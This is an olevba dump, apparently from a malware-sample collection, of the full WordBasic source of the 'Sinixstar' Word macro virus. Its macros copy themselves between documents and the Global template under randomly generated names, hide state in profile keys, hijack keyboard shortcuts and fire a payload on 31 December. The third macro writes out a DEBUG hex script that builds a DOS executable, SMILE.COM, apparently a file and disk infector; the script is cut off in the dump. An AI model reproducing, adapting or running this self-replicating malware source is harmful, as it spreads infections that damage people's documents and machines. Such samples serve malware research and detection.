olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-e64207605616450c4a51cb44a14bd5855e16a15e
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-e64207605616450c4a51cb44a14bd5855e16a15e 
in file: Virus.MSOffice.Source-e64207605616450c4a51cb44a14bd5855e16a15e - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Total macros: 3
==============================================================================
Macro name: Sinixstar1 [SINIXSTAR1] "U"
------------------------------------------------------------------------------
Sub MAIN
On Error Goto Done

A$ = DateiName$()
If A$ = "" Then Goto Finish

If VInstalled = 0 Then
	Run1
	Run2
	RunPayload
	DateiAllesSpeichern 1, 1
Else
	Goto Done
End If

Done:
A$ = DateiName$()
If A$ = "" Then
	Goto Finish
Else
	Einf�gen " "
End If

Finish:
MsgBox "Sinixstar", - 8
End Sub

Sub Run1
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R1$ = AbrufenDokumentVar$("VirNameDoc")
CO$ = DateiName$() + ":" + R1$
MakroKopieren CO$, "Global:" + Z$, 1
SetProfileString "Intl", "Info2", Z$
ExtrasAnpassenTastatur.TastenSchl�ssel = 65, .Kategorie = 2, .Name = Z$, .Hinzuf�gen, .Kontext = 0
End Sub

Sub Run2
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R2$ = AbrufenDokumentVar$("VirName")
OC$ = DateiName$() + ":" + R2$
MakroKopieren OC$, "Global:" + Z$, 1
SetProfileString "Intl", "Info1", Z$
ExtrasAnpassenTastatur.TastenSchl�ssel = 32, .Kategorie = 2, .Name = Z$, .Hinzuf�gen, .Kontext = 0
End Sub

Sub RunPayload
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R3$ = AbrufenDokumentVar$("VirNamePayload")
OCO$ = DateiName$() + ":" + R3$
MakroKopieren OCO$, "Global:" + Z$, 1
SetProfileString "Intl", "Info3", Z$
End Sub

Function VInstalled
CC$ = GetProfileString$("Intl", "Info1")
	VInstalled = 0
	If Z�hlenMakros(0) > 0 Then
		For i = 1 To Z�hlenMakros(0)
		If MakroName$(i, 0) = CC$ Then
			VInstalled = 1
		End If
	Next i
End If
End Function

Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
Num = Int(Rnd() * (Two - One) + One)
A$ = Str$(Num)
A$ = LTrim$(A$)

B$ = Mid$(A$, 1, 1)
C$ = Mid$(A$, 2, 1)
D$ = Mid$(A$, 3, 1)
E$ = Mid$(A$, 4, 1)

If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"

If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
==============================================================================
Macro name: Sinixstar2 [SINIXSTAR2] "U"
------------------------------------------------------------------------------
Sub MAIN
On Error Goto Finish

A$ = DateiName$()
If A$ = "" Then Goto Finish

CO$ = GetProfileString$("Intl", "Info1")
OC$ = GetProfileString$("Intl", "Info2")
OCO$ = GetProfileString$("Intl", "Info3")

If VInstalled = 1 Then
	Goto Finish
Else
	On Error Resume Next
	DateiSpeichernUnter.Format = 1
	Run1
	Run2
	RunPayload
	DateiAllesSpeichern 1, 0
End If

Finish:
A$ = DateiName$()
If A$ = "" Then
	Goto Finito
Else
	Einf�gen "a"
End If

Finito:
If Monat(Jetzt()) = 12 And Tag(Jetzt()) = 31 Then
	Goto Payload
Else
	Goto No
End If

Payload:
AK$ = GetProfileString$("Intl", "Info3")
ExtrasMakro.Name = AK$, .Ausf�hren, .Anzeigen = 0, .Beschreibung = "", .NeuerName = ""

No:
End Sub

Sub Run1
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

CO$ = GetProfileString$("Intl", "Info2")
MakroKopieren "Global:" + CO$, DateiName$() + ":" + Z$, 1
DokumentVariableBestimmen "VirName", Z$
ExtrasAnpassenTastatur.TastenSchl�ssel = 65, .Kategorie = 2, .Name = Z$, .Hinzuf�gen, .Kontext = 1
End Sub

Sub Run2
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

OC$ = GetProfileString$("Intl", "Info1")
MakroKopieren "Global:" + OC$, DateiName$() + ":" + Z$, 1
DokumentVariableBestimmen "VirNameDoc", Z$
ExtrasAnpassenTastatur.TastenSchl�ssel = 32, .Kategorie = 2, .Name = Z$, .Hinzuf�gen, .Kontext = 1
End Sub

Sub RunPayload
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

OCO$ = GetProfileString$("Intl", "Info3")
MakroKopieren "Global:" + OCO$, DateiName$() + ":" + Z$, 1
DokumentVariableBestimmen "VirNamePayload", Z$
End Sub

Function VInstalled
On Error Resume Next
CC$ = AbrufenDokumentVar$("VirNameDoc")
	VInstalled = 0
	If Z�hlenMakros(1) > 0 Then
		For i = 1 To Z�hlenMakros(1)
			If MakroName$(i, 1) = CC$ Then
				VInstalled = 1
			End If
		Next i
	End If
End Function

Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
Num = Int(Rnd() * (Two - One) + One)
A$ = Str$(Num)
A$ = LTrim$(A$)

B$ = Mid$(A$, 1, 1)
C$ = Mid$(A$, 2, 1)
D$ = Mid$(A$, 3, 1)
E$ = Mid$(A$, 4, 1)

If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"

If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
==============================================================================
Macro name: Sinixstar3 [SINIXSTAR3] "U"
------------------------------------------------------------------------------
Sub MAIN

DateiNeu.DokVorlage = "Normal", .DokVorlageNeu = 1
DokumentMaximieren
Schriftgrad 16
Fett
Schriftart "Arial"
Einf�gen "Thanks for beta testing the Sinixstar virus"

n = Sekunde(Jetzt())
m = n + 3
Again:
While n <> m
n = Sekunde(Jetzt())
Goto Again
Wend

On Error Goto Finish

a$ = GetProfileString$("Installed", "Yes")

If a$ = "" Then

a$ = MakroDateiName$("AutoOpen")
b$ = DateiNameInfo$(a$, 5)

Open b$ + "power.scr" For Output As #1
Print #1, "N SMILE.COM"
Print #1, "E 0100 4D 5A F3 01 0C 00 00 00 20 00 81 00 FF FF 60 01"
Print #1, "E 0110 00 08 00 00 1E 00 00 00 3E 00 00 00 01 00 FB 50"
Print #1, "E 0120 6A 72 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0310 00 00 00 00 00 00 00 00 00 00 00 00 FF FF 9C 83"
Print #1, "E 0320 EC 04 50 1E 06 FB 2E 83 3E 1C 00 FF 74 24 C7 06"
Print #1, "E 0330 06 00 F0 FE 8B EC 8C 5E 08 C7 46 06 00 01 8C DD"
Print #1, "E 0340 8C C8 05 58 01 8B D8 B9 F0 0F 03 C1 8E C0 0E 1F"
Print #1, "E 0350 EB 6C 8C CA 81 C2 58 01 8E DA 8B 0E 06 00 03 16"
Print #1, "E 0360 08 00 8B 36 18 00 E3 0F AD 8B F8 AD 03 C2 8E C0"
Print #1, "E 0370 8C C8 26 01 05 E2 F1 8B EC 8C C8 03 06 16 00 89"
Print #1, "E 0380 46 08 A1 14 00 89 46 06 8C CD 03 2E 0E 00 A1 04"
Print #1, "E 0390 00 8B 16 02 00 83 C2 FF 1D 00 00 B1 04 D3 EA 42"
Print #1, "E 03A0 FE C1 D3 E0 03 D0 03 16 0A 00 8B CA 2B 0E 08 00"
Print #1, "E 03B0 8C CB 8E DB 81 C3 58 01 03 DA 8E C3 2B D9 53 51"
Print #1, "E 03C0 B8 01 02 33 DB B9 01 00 BA 80 00 CD 13 72 51 BE"
Print #1, "E 03D0 51 01 33 FF B9 2B 00 FC F3 A6 74 44 BF C6 01 B9"
Print #1, "E 03E0 04 00 26 83 7D 02 00 77 0C 26 83 3D 0C 77 06 26"
Print #1, "E 03F0 83 3D 00 77 2B 83 C7 10 E2 E8 BE 51 01 33 FF B9"
Print #1, "E 0400 2B 00 FC E8 88 01 06 1F 0E 07 B8 0B 03 B9 02 00"
Print #1, "E 0410 CD 13 1E 07 0E 1F 72 08 B8 01 03 B9 01 00 CD 13"
Print #1, "E 0420 59 5B 8C CA 33 FF 06 57 51 B9 1C 00 BE 35 01 FC"
Print #1, "E 0430 F3 A4 59 FA CB 8B C1 8E DB 8E C2 33 F6 33 FF B9"
Print #1, "E 0440 08 00 F3 A5 43 42 8B C8 E2 EB 8E D5 FB 07 1F 58"
Print #1, "E 0450 CF FA 33 DB 8E DB 8E D3 BC 00 7C FB A1 13 04 2D"
Print #1, "E 0460 06 00 A3 13 04 B1 06 D3 E0 8E C0 B8 0B 02 B9 02"
Print #1, "E 0470 00 BA 80 00 CD 13 BB 7C 01 06 53 CB FA B8 16 02"
Print #1, "E 0480 87 06 70 00 2E A3 50 15 8C C8 87 06 72 00 2E A3"
Print #1, "E 0490 52 15 2E C7 06 54 15 FF FF 2E C7 06 56 15 FF FF"
Print #1, "E 04A0 2E C7 06 58 15 FF FF FB 0E 07 BE 00 7C BF 51 01"
Print #1, "E 04B0 B9 2B 00 FC E8 D7 00 B8 00 7C 1E 50 CB 50 56 1E"
Print #1, "E 04C0 0E 1F 8B 36 5A 15 FE 0E 5C 15 F6 06 5C 15 07 75"
Print #1, "E 04D0 28 46 81 FE 47 15 72 21 B0 34 E6 43 33 C0 E6 40"
Print #1, "E 04E0 E6 40 8E D8 2E A1 4C 15 A3 20 00 2E A1 4E 15 A3"
Print #1, "E 04F0 22 00 2E FE 06 5D 15 EB 15 89 36 5A 15 D0 04 8A"
Print #1, "E 0500 24 80 E4 01 D0 E4 E4 61 24 FC 0A C4 E6 61 B0 20"
Print #1, "E 0510 E6 20 1F 5E 58 CF 1E 50 53 33 C0 8E D8 A1 84 00"
Print #1, "E 0520 2E 39 06 54 15 75 0A A1 86 00 2E 39 06 56 15 74"
Print #1, "E 0530 17 A1 84 00 2E A3 54 15 A1 86 00 2E A3 56 15 2E"
Print #1, "E 0540 C7 06 58 15 B6 00 EB 3E 2E FF 0E 58 15 75 37 2E"
Print #1, "E 0550 A1 50 15 A3 70 00 2E A1 52 15 A3 72 00 B8 D4 03"
Print #1, "E 0560 87 06 84 00 2E A3 54 15 8C C8 87 06 86 00 2E A3"
Print #1, "E 0570 56 15 B8 10 00 BB 5E 15 2E C6 07 00 43 48 75 F8"
Print #1, "E 0580 2E C6 06 47 15 FF 5B 58 1F 2E FF 2E 50 15 26 8A"
Print #1, "E 0590 05 86 04 AA 46 E2 F7 C3 11 2A 03 12 2A 03 30 BF"
Print #1, "E 05A0 02 3C 43 04 3D 43 04 3E AC 03 42 89 03 45 00 04"
Print #1, "E 05B0 46 1C 04 4E 5A 03 4F 5A 03 5B 43 04 6C 34 04 50"
Print #1, "E 05C0 51 52 1E 0E 1F 2E 80 3E 47 15 00 74 56 B4 2A E8"
Print #1, "E 05D0 2B 02 39 0E 48 15 72 4B 39 16 4A 15 72 45 FA 33"
Print #1, "E 05E0 C0 8E D8 B8 BD 01 87 06 20 00 2E A3 4C 15 8C C8"
Print #1, "E 05F0 87 06 22 00 2E A3 4E 15 B0 34 E6 43 B0 80 E6 40"
Print #1, "E 0600 B0 00 E6 40 0E 1F C6 06 5D 15 00 C6 06 5C 15 00"
Print #1, "E 0610 C7 06 5A 15 47 06 FB 80 3E 5D 15 00 74 F9 C6 06"
Print #1, "E 0620 47 15 00 1F 5A 59 58 E9 BE 00 E8 D0 01 3C 00 75"
Print #1, "E 0630 55 9C 50 53 06 B4 2F E8 C3 01 26 80 3F FF 75 03"
Print #1, "E 0640 83 C3 08 26 8A 47 16 24 1F 3C 1F 75 35 26 81 6F"
Print #1, "E 0650 1C 80 15 26 83 5F 1E 00 EB 23 E8 A0 01 72 27 9C"
Print #1, "E 0660 50 53 06 B4 2F E8 95 01 26 8A 47 16 24 1F 3C 1F"
Print #1, "E 0670 75 10 26 81 6F 1A 80 15 26 83 5F 1C 00 26 80 77"
Print #1, "E 0680 16 1F 07 5B 58 9D CA 02 00 0B DB 74 5B 53 E8 73"
Print #1, "E 0690 01 5B 72 54 0A C0 75 07 81 C2 80 15 83 D1 00 E8"
Print #1, "E 06A0 5B 01 72 E2 2D 80 15 83 DA 00 EB DA 0B DB 74 38"
Print #1, "E 06B0 50 51 52 56 1E 0E 1F 53 E8 49 01 8B F3 5B 72 0D"
Print #1, "E 06C0 C7 04 00 00 80 7C 02 00 74 03 E8 B8 01 1F 5E 5A"
Print #1, "E 06D0 59 58 EB 14 53 51 BB 98 02 B9 0D 00 2E 3A 27 74"
Print #1, "E 06E0 0C 83 C3 03 E2 F6 59 5B 2E FF 2E 54 15 55 8B EC"
Print #1, "E 06F0 2E 8B 5F 01 87 5E 04 8B 4E 0A 87 4E 02 5D 9D C3"
Print #1, "E 0700 E8 FA 00 72 48 9C 53 52 E8 F9 00 72 09 2E 8A 57"
Print #1, "E 0710 02 8B D8 E8 0E 01 5A 5B 9D E9 C7 00 E8 DE 00 72"
Print #1, "E 0720 2C 9C 53 51 87 D9 E8 DB 00 72 03 2E 89 0F 59 5B"
Print #1, "E 0730 9D E9 AF 00 0A C0 75 B0 52 8B D6 E8 F6 00 5A 72"
Print #1, "E 0740 A7 EB 05 E8 EE 00 72 A0 E8 B2 00 73 03 E9 93 00"
Print #1, "E 0750 9C 50 53 51 52 1E 0E 1F 8B D8 B8 00 44 E8 9D 00"
Print #1, "E 0760 72 7B F7 C2 80 00 75 75 E8 7B 00 0B C2 75 33 E8"
Print #1, "E 0770 AA 00 72 69 B4 2A E8 84 00 80 C6 03 80 FE 0C 76"
Print #1, "E 0780 04 41 80 EE 0C 89 0E 48 15 89 16 4A 15 B4 40 B9"
Print #1, "E 0790 80 15 E8 66 00 72 3C 33 C1 75 38 B2 01 E8 84 00"
Print #1, "E 07A0 EB 3B E8 46 00 E8 74 00 72 33 E8 49 00 72 24 33"
Print #1, "E 07B0 C1 75 20 81 3E 00 00 4D 5A 75 18 39 06 08 00 75"
Print #1, "E 07C0 12 81 3E 12 00 AD DE 75 0A B2 00 E8 56 00 BA 80"
Print #1, "E 07D0 15 EB 02 33 D2 33 C9 B8 00 42 E8 20 00 1F 5A 59"
Print #1, "E 07E0 5B 58 9D CA 02 00 B8 02 42 EB 03 B8 00 42 33 C9"
Print #1, "E 07F0 EB 09 B4 40 EB 02 B4 3F B9 1E 00 33 D2 9C 2E FF"
Print #1, "E 0800 1E 54 15 C3 50 51 8B C3 BB 5E 15 B9 08 00 2E 3B"
Print #1, "E 0810 07 74 06 43 43 43 E2 F6 F9 59 58 C3 53 33 DB E8"
Print #1, "E 0820 E2 FF 5B C3 53 53 33 DB E8 D9 FF 2E 8F 07 2E 88"
Print #1, "E 0830 57 02 5B C3 50 51 56 57 32 E4 B9 00 01 8B F2 FC"
Print #1, "E 0840 AC 0A C0 74 16 3C 5C 74 08 3C 2E 74 08 E2 F1 EB"
Print #1, "E 0850 0A 32 E4 EB EB FE C4 8B FE EB E5 80 FC 01 75 1F"
Print #1, "E 0860 8B F7 AD 25 DF DF 8B C8 AC 24 DF 81 F9 43 4F 75"
Print #1, "E 0870 04 3C 4D 74 0B 81 F9 45 58 75 04 3C 45 74 01 F9"
Print #1, "E 0880 5F 5E 59 58 C3 B8 00 42 33 C9 BA 80 15 E8 6D FF"
Print #1, "E 0890 E8 63 FF 81 3E 00 00 4D 5A 74 3E C7 06 00 00 4D"
Print #1, "E 08A0 5A C7 06 18 00 1C 00 C7 06 1A 00 00 00 C7 06 0E"
Print #1, "E 08B0 00 48 01 C7 06 10 00 FE FF E8 2A FF 2D 80 15 83"
Print #1, "E 08C0 DA 00 A3 1C 00 B9 10 00 F7 F1 83 EA 01 BA 12 10"
Print #1, "E 08D0 1B D0 89 16 0A 00 EB 1E 90 C7 06 1C 00 FF FF B8"
Print #1, "E 08E0 58 01 03 06 08 00 01 06 0E 00 83 06 0A 00 20 83"
Print #1, "E 08F0 06 0C 00 20 73 06 C7 06 0C 00 FF FF C7 06 06 00"
Print #1, "E 0900 00 00 C7 06 08 00 00 00 C7 06 12 00 AD DE C7 06"
Print #1, "E 0910 16 00 00 00 C7 06 14 00 1E 00 E8 C9 FE B9 00 02"
Print #1, "E 0920 F7 F1 89 16 02 00 83 C2 FF 15 00 00 A3 04 00 E8"
Print #1, "E 0930 B9 FE E8 BD FE 72 0F B8 00 57 E8 C0 FE B8 01 57"
Print #1, "E 0940 80 C9 1F E8 B7 FE C3 F9 DC CC 66 33 33 74 66 E3"
Print #1, "E 0950 06 1C D8 F3 81 83 36 8C CC E2 E3 33 12 19 B8 62"
Print #1, "E 0960 C7 83 1E 19 CC CC C1 E6 4F 1C F8 62 F1 8E C7 33"
Print #1, "E 0970 18 E4 F9 B3 2C DD F1 36 47 FE 2E 08 FF 8B E3 3B"
Print #1, "E 0980 C4 F1 31 C6 D0 F3 CD C1 73 9B 83 CE 2E 0E B1 B0"
Print #1, "E 0990 33 CD 81 9E 36 8E 71 90 73 8C 87 38 F0 37 CD 83"
Print #1, "E 09A0 BC 7C 33 C7 C3 9C 78 19 C7 81 9C 4C 31 C5 C3 1C"
Print #1, "E 09B0 6E 39 E7 81 9C 78 19 C5 91 9C 6C 19 66 C9 9E 2E"
Print #1, "E 09C0 0C 71 E0 E7 8D A3 3C 4C 19 E3 68 E4 E5 83 83 9A"
Print #1, "E 09D0 9D 18 66 72 CE 47 C1 F1 0E E5 8C 37 C4 F1 7D 59"
Print #1, "E 09E0 1B 1D C3 F0 9D 1E 44 C1 F6 39 87 63 38 EE 19 86"
Print #1, "E 09F0 C4 F1 E6 18 06 18 B0 E7 33 8E 71 B2 71 CD 37 A0"
Print #1, "E 0A00 43 39 C6 8F B1 93 38 73 87 59 C1 9D 38 67 9C 70"
Print #1, "E 0A10 73 66 D9 E3 1E 4C 79 9C F1 23 47 38 E3 9B 0C 67"
Print #1, "E 0A20 BE 38 73 C6 69 96 61 8E 1C 71 E6 32 3C B9 C9 9C"
Print #1, "E 0A30 4C F8 E7 0D CC F8 64 C7 27 1C 71 C6 46 47 36 7C"
Print #1, "E 0A40 DB 63 87 30 3E 19 83 70 C4 1F 0E 33 E1 E1 38 6E"
Print #1, "E 0A50 01 CE 33 93 6E 0F 81 FC 7F 07 71 B8 1D 87 C0 EC"
Print #1, "E 0A60 3E 07 E3 E0 7F 1F 03 B0 F0 3F 8F 01 D8 F8 1D 8F"
Print #1, "E 0A70 83 B8 F8 3F 0F 83 70 F8 66 1C 86 E1 D0 EE 3D 0C"
Print #1, "E 0A80 C7 A1 DC 5A 19 C7 23 B8 F4 33 8B 43 38 A4 77 16"
Print #1, "E 0A90 86 73 68 EE 3C 8C E2 D9 CE 69 19 CC B3 1C D3 33"
Print #1, "E 0AA0 89 26 39 B4 C7 32 4C 73 2C C7 32 9C E6 49 8E 65"
Print #1, "E 0AB0 98 E6 59 8E 74 99 E6 D9 9E 6D 99 E3 41 8E 36 0E"
Print #1, "E 0AC0 F1 B0 66 C6 11 C7 1A 0E CC 69 3B 31 83 9C 99 87"
Print #1, "E 0AD0 87 13 18 1E 3B 86 63 BC 30 C3 70 C6 39 D8 C6 2C"
Print #1, "E 0AE0 6E 4C CD 32 4C B0 6E 13 31 D7 30 DE C7 0F 99 66"
Print #1, "E 0AF0 6B 26 C3 32 6C 33 2C 71 E4 C9 3C CC F1 CC B8 64"
Print #1, "E 0B00 CC C6 39 E3 20 1E 7F C1 9C 71 B8 9B 18 C9 C9 30"
Print #1, "E 0B10 6C E7 86 46 70 66 1C 67 73 B1 76 31 87 13 39 B1"
Print #1, "E 0B20 9B 1F 1C 79 F8 E6 1F 86 60 F8 E6 3C 66 73 33 1C"
Print #1, "E 0B30 33 19 89 99 8C DF 99 C5 C6 5C 2E 73 63 F3 73 19"
Print #1, "E 0B40 B3 39 99 B1 D9 F8 CF 4C CC F3 33 1B 3C C9 8C 73"
Print #1, "E 0B50 1C 63 33 89 E3 38 7F 13 B9 DE 73 F1 E6 1F 81 E0"
Print #1, "E 0B60 FC 0F 07 E1 F8 3E 0F 83 E0 78 3E 07 81 F0 78 1E"
Print #1, "E 0B70 07 81 E0 7C 3E 87 87 91 F0 F1 3E 3C 8F 0F 91 E1"
Print #1, "E 0B80 E4 78 7C 0F 0F 03 E3 E4 78 7C 1F 1B 83 E3 60 FC"
Print #1, "E 0B90 6C 9F 0D 93 A3 B0 74 76 0E 07 C1 E0 F8 3C 1F 07"
Print #1, "E 0BA0 C3 60 E8 6C 1C 0D 83 93 F1 F0 74 3E 0E 87 C1 F0"
Print #1, "E 0BB0 F8 3E 0F 0E C0 E1 D8 98 3F 1B 0F C3 C1 F8 7C 3F"
Print #1, "E 0BC0 0F 07 E0 F0 FE 1E 0E E3 C0 EE 3C 1E E3 E0 E7 8F"
Print #1, "E 0BD0 43 AC 79 9E 33 90 70 E6 58 CF C1 B3 3B 87 63 C6"
Print #1, "E 0BE0 0C CC F1 DB 07 13 F0 E4 6E 1F 85 C1 30 78 E6 2C"
Print #1, "E 0BF0 CD E1 9E 36 31 A6 78 DC 13 8C 83 B0 74 4F 83 81"
Print #1, "E 0C00 CC 7C 1F 03 C1 F9 CC 8C 96 26 48 C7 99 98 F8 7E"
Print #1, "E 0C10 8E 4F 83 83 F8 BE 1F 0F C3 F1 78 EC 60 CC 8F 0E"
Print #1, "E 0C20 39 39 F8 6E 3E 67 21 D8 F8 39 1F 06 66 78 CF 1C"
Print #1, "E 0C30 D8 0E 06 63 60 CC 3C 79 33 43 89 CF 11 9C 39 1E"
Print #1, "E 0C40 0B C6 E6 33 33 9D B3 94 60 F7 71 C0 CC CE 0F 23"
Print #1, "E 0C50 98 1C 1E 26 E0 F8 99 CE E3 E1 71 8E 43 98 98 59"
Print #1, "E 0C60 38 83 86 F2 38 E3 1C 17 83 78 3E 0F E1 F8 3F 07"
Print #1, "E 0C70 C1 F0 7E 0F 81 E0 7C 1F 07 C0 F8 3E 0F 83 E0 F8"
Print #1, "E 0C80 3E 0F 83 E0 F8 3C 0F 87 D0 F8 79 1F 0F 21 E1 E4"
Print #1, "E 0C90 3C 1E 47 C3 C8 F8 7C 0F 87 C1 F8 F8 1F 1F 83 E1"
Print #1, "E 0CA0 F0 3E 1F 03 83 F0 78 3B 0F 03 B0 66 37 0E C3 70"
Print #1, "E 0CB0 EC 37 0F C3 70 FC 37 8F C3 F8 F0 3F 8F 03 B8 F9"
Print #1, "E 0CC0 1B C7 A1 FC 39 1F C3 C1 FC 3C 1F 63 C0 F2 3C 4F"
Print #1, "E 0CD0 19 E6 79 CF B1 CE 3E C7 18 F0 1E 33 C0 F0 FC 1B"
Print #1, "E 0CE0 8F A1 F0 7E 1E 87 C0 F8 3C 1F 87 C0 F8 7E 0F 87"
Print #1, "E 0CF0 81 C4 B8 2F 0D C3 D8 7E 1B 87 C9 E2 1C 46 0D E2"
Print #1, "E 0D00 70 7C 47 03 E7 BC 4E 1E 18 E3 F1 EA 3E 0F A1 F8"
Print #1, "E 0D10 3E 0F 07 70 5A 63 70 E6 19 93 E1 F0 6E 3D C6 F0"
Print #1, "E 0D20 74 1D 17 67 30 F0 3A 2F 8F 71 CE 33 C6 C0 7E 3E"
Print #1, "E 0D30 0F 07 61 EC 3E 1F 07 F0 FE 3F 0F C3 F0 BE 1F 8F"
Print #1, "E 0D40 80 F8 3E 3F 8F 63 98 F3 3C 1F 07 81 D8 1C 07 0C"
Print #1, "E 0D50 D3 BC 7C 07 27 C0 74 77 0E C3 9C 78 BC 07 C3 C0"
Print #1, "E 0D60 EF 1F 83 C4 78 DC 13 CC 78 93 F8 59 81 D8 DF 8C"
Print #1, "E 0D70 FC FD 8F 3C ED 8F 1C CF 8E 78 DF 1E F1 FE 39 E3"
Print #1, "E 0D80 FC 63 8B B1 9E 2E 85 F8 F2 0E C7 C0 FB 1F 02 EC"
Print #1, "E 0D90 F9 1F 73 E4 1D 8B A0 EC 59 07 63 E4 39 9F 21 EC"
Print #1, "E 0DA0 78 0F 23 64 39 9B 35 C4 68 8F 33 66 B8 8D 10 E6"
Print #1, "E 0DB0 7C C7 39 E2 1C C7 90 E6 3C 43 99 F2 1C E7 C8 73"
